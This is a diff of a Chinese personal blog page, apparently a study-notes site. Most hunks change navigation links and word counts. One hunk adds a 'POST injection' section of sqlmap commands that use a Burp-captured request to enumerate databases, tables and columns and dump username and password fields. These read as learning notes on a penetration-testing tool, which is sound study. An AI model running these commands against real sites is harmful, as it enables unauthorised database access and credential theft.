@@ -64,7 +64,7 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="https://dezhoutorizhao.github.io/blog6/froeign%20key%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/" class="waves-effect waves-light">
+    <a href="/blog6/" class="waves-effect waves-light">
       
       <i class="fas fa-tags" style="zoom: 0.6;"></i>
       
@@ -75,7 +75,7 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/blog6/categories" class="waves-effect waves-light">
+    <a href="/blog6/" class="waves-effect waves-light">
       
       <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
       
@@ -167,7 +167,7 @@
         
         <li class="m-nav-item">
 	  
-		<a href="https://dezhoutorizhao.github.io/blog6/froeign%20key%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/" class="waves-effect waves-light">
+		<a href="/blog6/" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-tags"></i>
 			
@@ -178,7 +178,7 @@
         
         <li class="m-nav-item">
 	  
-		<a href="/blog6/categories" class="waves-effect waves-light">
+		<a href="/blog6/" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-bookmark"></i>
 			
@@ -452,7 +452,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    191
+                    368
                 </div>
                 
 
@@ -507,6 +507,25 @@
 </ol>
 <h1 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h1><ol>
 <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/a_small_rabbit/article/details/101110011">https://blog.csdn.net/a_small_rabbit/article/details/101110011</a></li>
+</ol>
+<h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><ol>
+<li>用burp抓包</li>
+<li>将抓到的包保存为.txt文件类型(右击，copy to file)</li>
+<li>sqlmap中的命令：sqlmap -r “admin.txt” -p n –dbs(-r表示加载一个文件，-p指定参数)</li>
+<li>sqlmap -r “admin.txt” -p n -D 暴库名 –tables</li>
+<li>sqlmap -r “admin.txt” -p n -D 暴库名 -T 表名 –columns</li>
+<li>sqlmap -r “admin.txt” -p n -D 暴库名 -T 表名 -C “username,password” –dump</li>
+</ol>
+<h2 id="指定参数（get传参来实现post注入）"><a href="#指定参数（get传参来实现post注入）" class="headerlink" title="指定参数（get传参来实现post注入）"></a>指定参数（get传参来实现post注入）</h2><ol>
+<li>sqlmap -u “url” –data “n=1&amp;p=1” –dbs(与上面类似)</li>
+<li>sqlmap -u “url” –data “username=1&amp;password=1” –dbs(假设参数是username和password)</li>
+</ol>
+<h2 id="r指定文件去暴库"><a href="#r指定文件去暴库" class="headerlink" title="-r指定文件去暴库"></a>-r指定文件去暴库</h2><ol>
+<li>python sqlmap.py -r 文件路径+文件名.txt –dbs</li>
+</ol>
+<h2 id="forms"><a href="#forms" class="headerlink" title="-forms"></a>-forms</h2><ol>
+<li>使用该命令，使sqlmap自己抓包</li>
+<li>sqlmap -u “url” –forms –level=5 –dbs</li>
 </ol>
 
                 
@@ -1002,7 +1021,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">23.8k</span>&nbsp;字
+                class="white-color">23.6k</span>&nbsp;字
             
             
             
